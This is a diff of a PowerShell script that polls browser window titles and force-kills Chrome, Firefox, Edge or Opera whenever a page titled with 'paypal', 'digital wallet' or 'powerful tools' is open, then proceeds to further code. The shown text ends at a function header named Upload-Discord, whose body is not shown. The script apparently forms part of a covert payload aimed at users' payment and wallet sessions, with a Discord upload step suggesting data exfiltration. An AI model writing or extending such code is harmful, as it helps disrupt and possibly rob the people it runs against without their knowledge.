@@ -1,5 +1,5 @@
 # Define the partial title you want to monitor (e.g., "TikTok")
-$targetTitle = "powerful tools"
+$targetTitles = @("powerful tools", "paypal", "digital wallet")
 
 # Define a list of popular browser process names
 $browserProcesses = @("chrome", "firefox", "msedge", "opera")
@@ -9,7 +9,7 @@ $checkInterval = 15
 
 # Outer loop to run continuously
 while ($true) {
-    # Loop until the condition is met
+    # Loop until any condition is met
     $conditionMet = $false
 
     while (-not $conditionMet) {
@@ -20,11 +20,11 @@ while ($true) {
                     try {
                         $processTitle = $process.MainWindowTitle
                         Write-Host "$browserName - Window Title: $processTitle"
-                        if ($processTitle -like "*$targetTitle*") {
-                            Write-Host "Detected TikTok in $browserName. Closing..."
+                        if ($targetTitles | ForEach-Object { $processTitle -like "*$_*" }) {
+                            Write-Host "Detected one of the specified titles in $browserName. Closing..."
                             Stop-Process -Id $process.Id -Force
-                            $conditionMet = $true  # Set the flag to true when the condition is met
-                            break 2  # Exit both inner and outer loops when the condition is met
+                            $conditionMet = $true  # Set the flag to true when any condition is met
+                            break 2  # Exit both inner and outer loops when any condition is met
                         }
                     } catch {
                         # Handle any exceptions that might occur (e.g., due to missing access permissions)
@@ -34,7 +34,7 @@ while ($true) {
         }
 
         if ($conditionMet) {
-            break  # Exit the outer loop when the condition is met
+            break  # Exit the outer loop when any condition is met
         }
 
         # Sleep for the specified interval (in seconds) before checking again
@@ -43,9 +43,7 @@ while ($true) {
 }
 
 # Continue with the rest of your script here
-Write-Host "The condition is met. Continue with the rest of your code here."
-
-
+Write-Host "A condition is met. Continue with the rest of your code here."
 
 
 function Upload-Discord {
